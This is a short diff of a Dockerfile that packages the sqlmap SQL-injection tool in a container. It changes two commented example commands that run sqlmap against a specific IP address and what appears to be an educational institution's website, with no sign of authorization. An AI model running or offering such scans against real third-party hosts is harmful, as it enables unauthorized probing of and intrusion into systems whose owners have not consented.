@@ -12,5 +12,5 @@ RUN echo "land007/python-sqlmap" > /.image_name
 #docker build -t land007/python-sqlmap:latest .
 #docker rm -f python-sqlmap ; docker run -it --privileged --name python-sqlmap land007/python-sqlmap:latest
 #> docker buildx build --platform linux/amd64,linux/arm64,linux/arm/v7 -t land007/python-sqlmap --push .
-#python python-sqlmap.py -u "http://202.102.85.228/ssjgy.jsp?wbtreeid=1001" --batch --banner
-#python python-sqlmap.py -u "http://szclsx.gusuedu.cn/ssjgy.jsp?wbtreeid=1001" --batch --banner
+#python sqlmap.py -u "http://202.102.85.228/ssjgy.jsp?wbtreeid=1001" --batch --banner
+#python sqlmap.py -u "http://szclsx.gusuedu.cn/ssjgy.jsp?wbtreeid=1001" --batch --banner
